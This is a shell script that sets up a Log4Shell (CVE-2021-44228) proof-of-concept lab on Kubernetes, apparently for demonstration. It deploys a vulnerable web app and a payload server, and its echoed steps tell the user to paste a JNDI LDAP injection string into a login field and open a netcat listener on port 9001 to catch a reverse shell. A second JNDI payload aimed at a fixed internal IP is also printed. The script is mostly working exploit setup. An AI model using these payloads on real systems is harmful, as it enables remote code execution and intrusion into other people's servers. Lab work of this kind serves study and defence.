echo " Get Master Node Internal IP Adress "
masternode=$(sudo kubectl get nodes --selector=node-role.kubernetes.io/master -o jsonpath={.items[*].status.addresses[?\(@.type==\"InternalIP\"\)].address})
echo " Maseternode IP : " $masternode
echo " add master node ip to "
sed  "s/masternodeip/${masternode}/g" ./cve-poc-deployment.yaml.template > ./cve-poc-deployment.yaml 
echo "sed done"
echo "Start creating the services for web and payload pod "
kubectl create ns log4j
kubectl -n log4j apply -f cve-web-deployment.yaml
kubectl -n log4j apply -f cve-web-service.yaml
kubectl -n log4j apply -f cve-poc-service.yaml
kubectl -n log4j apply -f cve-poc-deployment.yaml
kubectl -n log4j get svc
echo " Open a browser http://public IP worker node for cve-web-deployment pod :32080/log4shell"
echo " paste ${jndi:ldap://IP-of-workernode:32095/a} replace IP with : "$masternode" in Userfield at login Browser in order start connection "
echo " Open a shell to the masternode execute : nc -lv " $masternode "9001  to wait for a shell connection from cve-web-service where the java code runs "
echo " general "${jndi:ldap://172.16.238.11:1389/a}"



